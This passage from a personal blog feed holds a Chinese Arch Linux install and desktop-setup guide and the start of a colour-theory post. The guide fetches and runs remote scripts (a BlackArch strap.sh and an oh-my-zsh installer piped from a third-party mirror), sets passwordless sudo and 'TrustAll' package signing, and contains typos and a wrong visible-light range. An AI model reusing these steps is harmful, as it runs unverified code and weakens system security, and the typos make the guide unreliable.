class="headerlink" title="安装前的配置"></a>安装前的配置</h3><ol><li><p>插入 U 盘，在 BIOS 中将其作为第一启动项</p></li><li><p>启动设备，进入 Archiso</p></li><li><p>检查引导方式</p><pre><code class="shell">ls /sys/firmware/efi/efivars# 如果不存在结果则是BIOS引导，反之是UEFI启动</code></pre></li><li><p>连接网络（无线网络）</p><pre><code class="shell">iwctldevice list # 显示网络设备，比如我是wlan0station wlan0 scan # 扫描无线网络station wlan0 get-networks # 获取无线网络station wlan0 connect SSID # 连接网络，SSID自行修改# 如果存在密码会让你输入，照做即可# 退出iwctlping baidu.com # 测试下网络连接是否正常</code></pre></li><li><p>磁盘分区</p><pre><code class="shell">lsblk # 查看磁盘</code></pre><p>这里我使用 <a href="https://wiki.archlinux.org/index.php/LVM_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">LVM 分区</a>方式分区，使用 LVM 分区的好处是能够在系统安装后随意改变分区大小、迁移分区等，比较灵活。</p><p>LVM 的基本组成部分如下：</p><ul><li>物理卷 (PV)<br>一个可供存储 LVM 的块设备. 例如: 一块硬盘, 一个 MBR 或 GPT 分区, 一个回环文件, 一个被内核映射的设备 (例如 dm-crypt).它包含一个特殊的 LVM 头。</li><li>卷组 (VG)<br>物理卷的一个组，作为存放逻辑卷的容器。</li><li>逻辑卷 (LV)<br>“虚拟/逻辑卷”存放在一个卷组中并由物理块组成。是一个类似于物理设备的块设备，例如，你可以直接在它上面创建一个文件系统文件系统。</li><li>物理块 (PE)<br>一个卷组中最小的连续区域(默认为 4 MiB)，多个物理块将被分配给一个逻辑卷。你可以把它看成物理卷的一部分，这部分可以被分配给一个逻辑卷。</li></ul><p>这里使用<strong>cfdisk</strong>工具分区，将需要的分区类型设置为 LVM（Type 选项），选择 Write 写入分区表。</p><p><strong>以下命令参照自身情况自行修改：</strong></p><pre><code class="shell">cfdisk /dev/nvme1n1 # 修改nvme1n1（SSD）的分区，如下图cfdisk /dev/nvme0n1cfdisk /dev/sda</code></pre><p><img src="/start-with-arch/DeepinScreenshot_plasmashell_20201022011144.png" class="lazyload" data-srcset="/start-with-arch/DeepinScreenshot_plasmashell_20201022011144.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><ul><li><p>创建物理卷</p><pre><code class="shell">pvcreate /dev/nvme1n1p1pvcreate /dev/sda4pvdisplay # 查看已创建物理卷</code></pre></li><li><p>创建卷组</p><pre><code>vgcreate vgp /dev/nvme1n1p1vgcreate vgq /dev/sda4vgdisplay # 查看已创建卷组</code></pre></li><li><p>创建逻辑卷</p><pre><code class="shell">lvcreate -L 225G vgp -n lvroot # 分配225G空间给root分区lvcreate -l +100%FREE vgp -n lvswap # 分配剩余空间给swap分区lvcreate -l +100%FREE vgq -n lvhome # 分配全部空间给home分区</code></pre></li><li><p>挂载分区</p><p><strong>boot 所在分区我个人使用的大小是 200M，千万不能太小，不然无法使用 LVM 方式！</strong></p><pre><code class="shell">mount /dev/vgp/lvroot /mntmkdir /mnt/bootmount /dev/nvme0n1p1 /mnt/bootmkdir /mnt/homemount /dev/vgq/lvhome /mnt/home</code></pre></li></ul></li></ol><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><h4 id="编辑镜像源"><a href="#编辑镜像源" class="headerlink" title="编辑镜像源"></a>编辑镜像源</h4><pre><code class="shell">vim /etc/pacman.d/mirrorlist# 将国内源放到最前面# 163Server = http://mirrors.163.com/archlinux/$repo/os/$arch# 清华Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</code></pre><h4 id="安装基本包"><a href="#安装基本包" class="headerlink" title="安装基本包"></a>安装基本包</h4><pre><code class="shell">pacstrap /mnt base linux linux-firmware</code></pre><h4 id="配置-fastab"><a href="#配置-fastab" class="headerlink" title="配置 fastab"></a>配置 fastab</h4><p>用于自动挂载分区</p><pre><code class="shell">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</code></pre><h4 id="进入-Chroot-环境"><a href="#进入-Chroot-环境" class="headerlink" title="进入 Chroot 环境"></a>进入 Chroot 环境</h4><pre><code class="shell">arch-chroot /mnt</code></pre><h4 id="配置-mkinitcpio"><a href="#配置-mkinitcpio" class="headerlink" title="配置 mkinitcpio"></a>配置 mkinitcpio</h4><p>由于根文件系统基于 LVM，因此需要启用 mkinitcpio 钩子，否则系统可能无法启动。</p><p>编辑 <em>/etc/mkinitcpio.conf</em> 文件，在 <code>block</code> 和 <code>filesystems</code> 之间插入 <code>lvm2</code>。</p><p><em>/etc/mkinitcpio.conf</em></p><pre><code>HOOKS=&quot;base udev ... block lvm2 filesystems ... &quot; # &#39;...&#39;是我省略了的内容，不要写省略号上去！</code></pre><p>然后重新生成 initramfs：</p><pre><code class="shell">mkinitcpio -p linux</code></pre><p>如果报错请自行检查，记得要把 boot 分区至少设置为 200MB，否则会报空间不足的错误。</p><h4 id="更改时区"><a href="#更改时区" class="headerlink" title="更改时区"></a>更改时区</h4><pre><code class="shell">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc</code></pre><h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><p><em>/etc/hostname</em></p><pre><code>Secriy-Laptop</code></pre><p><em>/etc/hosts</em></p><pre><code>127.0.0.1 localhost::1   localhost127.0.1.1 Secriy-Laptop.localdomain Secriy-Laptop</code></pre><h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><pre><code class="shell">passwd</code></pre><h4 id="安装引导"><a href="#安装引导" class="headerlink" title="安装引导"></a>安装引导</h4><p>这里使用 GRUB</p><pre><code class="shell">pacman -S grub efibootmgr # 安装GRUBgrub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Archgrub-mkconfig -o /boot/grub/grub.cfg # 配置</code></pre><h4 id="安装必需软件"><a href="#安装必需软件" class="headerlink" title="安装必需软件"></a>安装必需软件</h4><p>网络管理工具必须安装，否则你没法联网还要回过来下载</p><pre><code class="shell">pacman -S iwd networkmanager dhcpcdsystemctl enable --now iwd.servicesystemctl enable --now NetworkManger.service # 设置开机自启动并直接启动</code></pre><h3 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h3><pre><code class="shell">exit # 退出chrootreboot # 重启</code></pre><h2 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h2><h3 id="配置-GRUB"><a href="#配置-GRUB" class="headerlink" title="配置 GRUB"></a>配置 GRUB</h3><pre><code class="shell">grub-mkconfig -o /boot/grub/grub.cfg # 寻找启动项，生成grub配置</code></pre><p>这里我的机器怎么也找不到 Windows 的启动项了，经过尝试得出解决方案如下：</p><pre><code class="shell">pacman -S os-probergrub-mkconfig -o /boot/grub/grub.cfgreboot</code></pre><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><p>配置 NetworkManager 使用 iwd</p><p><em>/etc/NetworkManager/NetworkManager.conf</em></p><pre><code>[device]wifi.backend=iwd</code></pre><p>启动 wpa_supplicant</p><pre><code class="shell">systemctl enable --now wpa_supplicant.servicesystemctl restart NetworkManager.service</code></pre><h3 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h3><ol><li><p>添加用户</p><pre><code class="shell">useradd -m -G wheel secriy # 创建用户passwd secriy # 设置密码usermod -d /home/Secriy -m secriy # 修改用户目录名</code></pre></li><li><p>配置 sudo 权限</p><pre><code class="shell">pacman -S sudo # 安装sudoEDITOR=vim visudo # 使用vim编辑sudoers文件</code></pre></li><li><p>将以下文字取消注释</p><pre><code>%wheel ALL=(ALL) NOPASSWD: ALL</code></pre></li></ol><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><pre><code class="shell"># intelpacman -S xf86-video-intel# Nvidiapacman -S nvdia</code></pre><h3 id="安装-Xorg"><a href="#安装-Xorg" class="headerlink" title="安装 Xorg"></a>安装 Xorg</h3><pre><code class="shell">pacman -S xorg # 安装所有程序包</code></pre><h3 id="安装-KDE-Plasma"><a href="#安装-KDE-Plasma" class="headerlink" title="安装 KDE(Plasma)"></a>安装 KDE(Plasma)</h3><p>个人使用，可以选择其他 DE</p><pre><code class="shell">pacman -S plasma kde-applications</code></pre><h3 id="安装-sddm"><a href="#安装-sddm" class="headerlink" title="安装 sddm"></a>安装 sddm</h3><pre><code class="shell">pacman -S sddmsystemctl enable sddm</code></pre><h3 id="安装-NetworkManager-图形化组件"><a href="#安装-NetworkManager-图形化组件" class="headerlink" title="安装 NetworkManager 图形化组件"></a>安装 NetworkManager 图形化组件</h3><pre><code class="shell">pacman -S nm-connection-editor network-manager-applet plasma-nm</code></pre><p>安装完就可以重启了</p><h2 id="完整配置"><a href="#完整配置" class="headerlink" title="完整配置"></a>完整配置</h2><h3 id="配置-AUR-源"><a href="#配置-AUR-源" class="headerlink" title="配置 AUR 源"></a>配置 AUR 源</h3><pre><code class="shell">sudo pacman -S archlinuxcn-keyring# 安装blackarchcurl -O https://blackarch.org/strap.shsudo chmod +x strap.sh./strap.sh</code></pre><p><em>/etc/pacman.conf</em></p><pre><code># archlinuxcn源[archlinuxcn]SigLevel=TrustedOnlyServer = https://mirrors.ustc.edu.cn/archlinuxcn/$arch# blackarch源，主要提供渗透测试工具，普通用户无需添加[blackarch]SigLevel = Optional TrustAllServer = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch</code></pre><pre><code class="shell">sudo pacman -Syyu # 更新系统和软件包，无论是否安装blackarch都必须执行</code></pre><h3 id="基础软件安装"><a href="#基础软件安装" class="headerlink" title="基础软件安装"></a>基础软件安装</h3><pre><code class="shell">sudo pacman -S git wget zsh apper yay ranger # ranger为命令行下文件管理工具</code></pre><h3 id="配置-oh-my-zsh"><a href="#配置-oh-my-zsh" class="headerlink" title="配置 oh-my-zsh"></a>配置 oh-my-zsh</h3><pre><code class="shell">chsh -s /usr/bin/zsh # 修改默认shellsh -C &quot;$(wget https://acgfate-dl.oss-cn-shanghai.aliyuncs.com/install.sh -O -)&quot;sudo vim ~/.zshrc # 修改配置文件</code></pre><p>主题：ys</p><p>插件：</p><ul><li><p>git</p></li><li><p>autojump</p></li><li><p>zsh-autosuggestions</p><pre><code class="shell">git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</code></pre></li><li><p>zsh-syntax-highlighting</p><pre><code class="shell">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</code></pre></li></ul><h3 id="字体安装"><a href="#字体安装" class="headerlink" title="字体安装"></a>字体安装</h3><pre><code class="shell">sudo pacman -S ttf-monaco adobe-source-han-sans-cn-fonts</code></pre><h3 id="系统美化"><a href="#系统美化" class="headerlink" title="系统美化"></a>系统美化</h3><h4 id="Plasma"><a href="#Plasma" class="headerlink" title="Plasma"></a>Plasma</h4><ul><li><p>Widgets</p><ul><li>Active Window Control</li><li>Application Title</li><li>Global Menu</li><li>Netspeed</li><li>System Loader View</li><li>Thermal Monitor</li><li>Color Picker</li><li>Digital Clock</li><li>Application Dashboard</li></ul></li><li><p>Latte Dock</p><pre><code class="shell">sudo pacman -S latte-dock</code></pre></li></ul><h4 id="Grub"><a href="#Grub" class="headerlink" title="Grub"></a>Grub</h4><p><strong>可使用图形化工具：</strong></p><pre><code class="shell">sudo pacman -S grub-customizer</code></pre><ol><li><p>下载主题</p></li><li><p>解压</p></li><li><p>执行 install.sh 自动安装</p></li><li><p>修改分辨率</p><p><em>/etc/default/grub</em></p><pre><code>GRUB_GFXMODE=1920x1080</code></pre></li><li><p>修改字体</p><pre><code class="shell">sudo grub-mkfont -s 16 -o /boot/grub/fonts/Monaco_Linux.pf2 /usr/share/fonts/TTF/Monaco_Linux.ttf</code></pre><p><em>/etc/default/grub</em></p><pre><code>GRUB_FONT=&quot;/bot/grub/fonts/Monaco_Linux.pf2&quot;</code></pre><pre><code class="shell">grub-mkconfig -o /boot/grub/grub.cfg</code></pre></li></ol><h2 id="软件安装-amp-配置"><a href="#软件安装-amp-配置" class="headerlink" title="软件安装&amp;配置"></a>软件安装&amp;配置</h2><h3 id="输入法（fcitx5）"><a href="#输入法（fcitx5）" class="headerlink" title="输入法（fcitx5）"></a>输入法（fcitx5）</h3><p>安装</p><pre><code class="shell">sudo pacman -S fcitx5 fcitx5-configtool # 主程序、配置工具sudo pacman -S fcitx5-chinese-addons # 输入法引擎sudo pacman -S fcitx5-qt fcitx5-gtk # 输入法模块sudo pacman -S fcitx5-pinyin-zhwiki # 肥猫制作的维基百万词库sudo pacman -S fcitx5-pinyin-moegirl # 萌娘百科词库</code></pre><p>配置</p><p>_~/.pam_environment_</p><pre><code>INPUT_METHOD  DEFAULT=fcitx5GTK_IM_MODULE DEFAULT=fcitx5QT_IM_MODULE  DEFAULT=fcitx5XMODIFIERS    DEFAULT=@im=fcitx5</code></pre><p><em>~/.xprofile</em></p><pre><code>export GTK_IM_MODULE=fcitx5export XMODIFIERS=@im=fcitx5export QT_IM_MODULE=fcitx5fcitx5 &amp;</code></pre><p>注销后重新登录</p><h3 id="必需软件"><a href="#必需软件" class="headerlink" title="必需软件"></a>必需软件</h3><ul><li>xsettingsd：解决 KDE 下 wine 程序不能运行的问题</li><li>ttf-wps-fonts：WPS 必需字体</li></ul><h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><ul><li>启动 SSH 服务</li></ul><pre><code class="shell">sudo systemctl enable sshd.servicesudo systemctl start sshd.service</code></pre><h3 id="将-xsettingsd-设置为自启动"><a href="#将-xsettingsd-设置为自启动" class="headerlink" title="将 xsettingsd 设置为自启动"></a>将 xsettingsd 设置为自启动</h3><p><img src="/start-with-arch/DeepinScreenshot_select-area_20200801023450-1596222003471.png" class="lazyload" data-srcset="/start-with-arch/DeepinScreenshot_select-area_20200801023450-1596222003471.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="将xsettingsd设置为自启动"></p><h3 id="卸载无用软件包"><a href="#卸载无用软件包" class="headerlink" title="卸载无用软件包"></a>卸载无用软件包</h3><pre><code class="shell">sudo pacman -R package-name</code></pre><h3 id="清理软件包"><a href="#清理软件包" class="headerlink" title="清理软件包"></a>清理软件包</h3><pre><code class="shell">sudo pacman -Scc # 清理安装包缓存sudo pacman -R $(pacman -Qtdq) # 清理孤立软件包</code></pre><h2 id="软件-amp-工具"><a href="#软件-amp-工具" class="headerlink" title="软件 &amp; 工具"></a>软件 &amp; 工具</h2><h3 id="日常软件"><a href="#日常软件" class="headerlink" title="日常软件"></a>日常软件</h3><h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h4><ul><li>浏览器：<ul><li>Chrome</li><li>Chromium</li><li>FireFox</li><li>Tor Browser</li></ul></li><li>v2ray GUI：Qv2ray</li><li>邮箱：Thunderbird + birdtray</li><li>网盘：<ul><li>百度网盘</li><li>MEGA Sync</li></ul></li><li>下载:<ul><li>aria2</li><li>uget</li><li>qBittorrent：qbittorrent</li></ul></li></ul><h4 id="通讯"><a href="#通讯" class="headerlink" title="通讯"></a>通讯</h4><ul><li>Telegram</li><li>Tim：deepin.com.qq.office</li><li>微信：deepin-wine-wechat</li></ul><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><ul><li>VLC</li></ul><h4 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h4><ul><li>网易云音乐</li></ul><h4 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h4><ul><li>Gwenview</li></ul><h4 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h4><ul><li>WPS Office</li></ul><h4 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h4><ul><li>Typora</li><li>Calibre</li><li>电子书阅读器：<ul><li>Foliate</li></ul></li><li>PDF 阅读器：<ul><li>Evince</li></ul></li><li>翻译器：<ul><li>Crow Tanslate</li></ul></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>输入法：fcitx5</li><li>虚拟机：VMware Workstation</li><li>截图：flameshot</li><li>文件管理器：<ul><li>dolphin</li><li>ranger</li></ul></li><li>FTP 工具：FileZilla</li><li>单词记忆：Anki</li><li>密码管理：KeePassXC</li><li>计算器：SpeedCrunch</li><li>输出本机信息：neofetch</li><li>彩色输出：lolcat</li></ul><h3 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h3><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><ul><li>Node.js</li><li>Go</li><li>Python 3/2</li></ul><h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h4><ul><li>vim</li><li>leafpad</li><li>Visual Studio Code</li><li>Sublime Text 3</li><li>TeX Live</li><li>TeX Studio</li></ul><h4 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h4><ul><li>Intellij-IDEA</li><li>Goland</li><li>PyCharm</li><li>Android Studio</li><li>Matlab</li></ul><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><ul><li>SQLite</li><li>MariaDB</li><li>Navicat15 Premium</li><li>DB Browser for SQLite</li></ul><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul><li>Postman</li></ul><h4 id="代码管理"><a href="#代码管理" class="headerlink" title="代码管理"></a>代码管理</h4><ul><li>GitHub Desktop</li><li>Git</li></ul><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><ul><li>Zeal：zeal<br>离线文档阅读器</li><li>iPython：ipython</li><li>Docker：docker</li><li>npm</li></ul><h3 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h3><ul><li>HTTP 抓包<ul><li>Charles：charles</li></ul></li><li>流量分析<ul><li>Wireshark：wireshark</li></ul></li><li>信息查看<ul><li>GHex：ghex<br>十六进制查看器</li></ul></li></ul><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><ol><li><p>无法使用中文</p><p>根据上文的输入法配置，软件基本上都是能够正常使用中文的。由于我的系统语言是默认的英文，终端无法显示中文字符，将语言格式化改为 UTF8 格式即可。</p><pre><code class="shell">$ localeLANG=en_US.UTF-8LC_CTYPE=&quot;en_US.UTF-8&quot;LC_NUMERIC=en_US.UTF-8LC_TIME=en_US.UTF-8LC_COLLATE=&quot;en_US.UTF-8&quot;LC_MONETARY=&quot;en_US.UTF-8&quot;LC_MESSAGES=&quot;en_US.UTF-8&quot;LC_PAPER=&quot;en_US.UTF-8&quot;LC_NAME=&quot;en_US.UTF-8&quot;LC_ADDRESS=&quot;en_US.UTF-8&quot;LC_TELEPHONE=&quot;en_US.UTF-8&quot;LC_MEASUREMENT=zh_CN.UTF-8LC_IDENTIFICATION=&quot;en_US.UTF-8&quot;LC_ALL=</code></pre><p><img src="/start-with-arch/DeepinScreenshot_select-area_20201011151238.png" class="lazyload" data-srcset="/start-with-arch/DeepinScreenshot_select-area_20201011151238.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>经测试，Tim 和各类软件均能够正常输入中文。</p></li><li><p>无线网络冲突</p><p>经常遇到连接无线网需要超级长时间的问题，并且大多数情况都会失败。后来发现是网络工具冲突，wpa_supplicant 和 NetworkManager 不要分开安装，直接安装 NetworkManager 即可，另外将 NetworkManager 的 backend 替换为 iwd。具体原因细节我没有深究，文章已经修改为正确的步骤。</p></li><li><p>Tim 部分中文显示异常（显示为方块）</p><p>修改*/opt/deepinwine/tools/run.sh*，将<strong>WINE_CMD</strong>改为以下文本：</p><pre><code class="sh">WINE_CMD=&quot;LC_ALL=zh_CN.UTF-8 deepin-wine</code></pre></li><li><p>Jetbrains 系列软件无法使用 GlobalMenu（全局菜单）</p><p>通过点击 Help-&gt;Show Log in Dolphin 查看日志，发现报错如下：</p><p><img src="/start-with-arch/image-20210117230158797.png" class="lazyload" data-srcset="/start-with-arch/image-20210117230158797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>因此可以确定是找不到 JavaFX 环境，在<strong>Plugins Marketplace</strong>下载安装即可。</p><p><img src="/start-with-arch/image-20210117230358483.png" class="lazyload" data-srcset="/start-with-arch/image-20210117230358483.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;装完系统累死我了，淦！&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="Linux" scheme="https://blog.secriy.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>关于色彩及其搭配的探索</title>
    <link href="https://blog.secriy.com/color-note/"/>
    <id>https://blog.secriy.com/color-note/</id>
    <published>2020-07-21T07:31:23.000Z</published>
    <updated>2025-02-16T07:13:36.790Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>实在闲得无聊随便写写，关于色彩理论我研究的不多，因此这篇文章可能要连续更新很久。</p><p>设计中色彩搭配是必须的一环，不同的色彩搭配展现的视觉效果完全不同。虽然每个人有不同的审美，但有些色彩搭配能够得到人们的一致肯定，有些则有相反的结果。</p></div><span id="more"></span><h2 id="色彩理论"><a href="#色彩理论" class="headerlink" title="色彩理论"></a>色彩理论</h2><h3 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h3><h4 id="光谱"><a href="#光谱" class="headerlink" title="光谱"></a>光谱</h4><p>人类对颜色的感知来自<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E8%A7%81%E5%85%89%E8%B0%B1">可见光谱</a>中的<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E7%A3%81%E8%BE%90%E5%B0%84">电磁辐射</a>对人眼<a href="https://zh.wikipedia.org/wiki/%E8%A7%86%E9%94%A5%E7%BB%86%E8%83%9E">视锥细胞</a>的刺激。可见光指的是波长在约 312.30 纳米至 745.40 纳米之间的电磁波，人眼只能够感受到这个范围的电磁波。波长是决定光谱颜色最重要的因素，对于人眼，光的强度也能决定其感受到的颜色。</p><p><img src="/color-note/image-20200721155753441.png" class="lazyload" data-srcset="/color-note/image-20200721155753441.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="可见光的光谱"></p><h4 id="混合色"><a href="#混合色" class="headerlink" title="混合色"></a>混合色</h4><p>大多数光源的光谱并非是单色，也就是说并非是单一波长的光，而是由不同强度和波长的光混合而成的，称为混合色。然而人眼无法区分二者。</p><p>某些光无法以单色存在，例如黑色、灰色、白色、粉红色，他们只可能由多个波长的光组成。</p><h4 id="物体的颜色"><a href="#物体的颜色" class="headerlink" title="物体的颜色"></a>物体的颜色</h4><p>物体展现的颜色是由它<strong>吸收</strong>和<strong>反射</strong>的光决定的，能够反射所有波长的光的物体表面是白色的，而能够吸收所有波长的光的物体表面是黑色的。红色的物体之所以呈现为红色是因为它将除红色外的其他颜色对应波长的光都吸收了，其他颜色的物体依此类推。</p><h3 id="三原色"><a href="#三原色" class="headerlink" title="三原色"></a>三原色</h3><p>原色是可以混合产生其他颜色的颜色集合，但它们本身无法通过其他颜色混合得到。物理课本讲述光学的部分会提到三原色是指红、绿、蓝三色，我们也会经常听到 RGB 的说法，然而在某些领域会称红、黄、蓝为三原色。这其实是因为我们谈论的并不是同样的一种东西。</p><h4 id="加法三原色（RGB）"><a href="#加法三原色（RGB）" class="headerlink" title="加法三原色（RGB）"></a>加法三原色（RGB）</h4><p>红（Red）、绿（Green）蓝（Blue）三原色可以组合成人类视觉可以感知的所有颜色，实际上不止这三种颜色能够组合成其他的所有颜色，但是由于人类的生理原因，RGB 三原色不可分解，因此就选用这三种颜色作为三原色。</p><p>下图是常见的三原色混合图。我们平时说的三原色就是指 RGB，彩色显示器正是利用了这一基本原理。</p><p><img src="/color-note/f6c1cc7bbc763fac71e2c556013cbac1_1440w.png" class="lazyload" data-srcset="/color-note/f6c1cc7bbc763fac71e2c556013cbac1_1440w.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="加法三原色"></p><h4 id="减法三原色（三基色，CMY）"><a href="#减法三原色（三基色，CMY）" class="headerlink" title="减法三原色（三基色，CMY）"></a>减法三原色（三基色，CMY）</h4><p>光的三原色是加法混合，三原色叠加会组合成白色的混合色，然而由于物体的颜色由其反射光的性质决定，因此现实中的物体并不适用加法三原色，这里就需要用减法三原色去解释和应用。</p><p>蓝绿色（Cyan）、紫红色（Magenta）、黄色（Yellow）是减法三原色，加上黑色（K：KEY PLATE，定位套版，通常使用黑色）就是 CMYK 印刷色彩模式，广泛用于印刷领域。减法三原色的组合也就能够解释为什么我们把不同颜色的颜料混合最终会变成黑色而不是白色。这三种颜色通常被统称为“青品（品红）黄”。</p><p><img src="/color-note/98467548b87fa9003ee1c002dcf950c8_1440w.png" class="lazyload" data-srcset="/color-note/98467548b87fa9003ee1c002dcf950c8_1440w.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="减法三原色"></p><p>由于在实际印刷时，受限于颜料本身并非理论上的纯色，三色叠加产生的并非黑色，而是深灰色或褐色，因此一般会在 CMY 的基础上增加黑色 K 来更准确、廉价地生成黑色。</p><h3 id="HSB-色彩模式"><a href="#HSB-色彩模式" class="headerlink" title="HSB 色彩模式"></a>HSB 色彩模式</h3><h2 id="色彩搭配"><a href="#色彩搭配" class="headerlink" title="色彩搭配"></a>色彩搭配</h2>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;实在闲得无聊随便写写，关于色彩理论我研究的不多，因此这篇文章可能要连续更新很久。&lt;/p&gt;&lt;p&gt;设计中色彩搭配是必须的一环，不同的色彩搭配展现的视觉效果完全不同。虽然每个人有不同的审美，但有些色彩搭配能够得到人们的一致肯定，有些则有相反的结果。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="摸鱼划水" scheme="https://blog.secriy.com/categories/%E6%91%B8%E9%B1%BC%E5%88%92%E6%B0%B4/"/>
    
    
    <category term="Design" scheme="https://blog.secriy.com/tags/Design/"/>
    
    <category term="Chromatics" scheme="https://blog.secriy.com/tags/Chromatics/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro 环境搭建</title>
    <link href="https://blog.secriy.com/start-with-manjaro/"/>
    <id>https://blog.secriy.com/start-with-manjaro/</id>
    <published>2020-07-12T12:07:22.000Z</published>
    <updated>2025-02-16T07:13:36.770Z</updated>
    
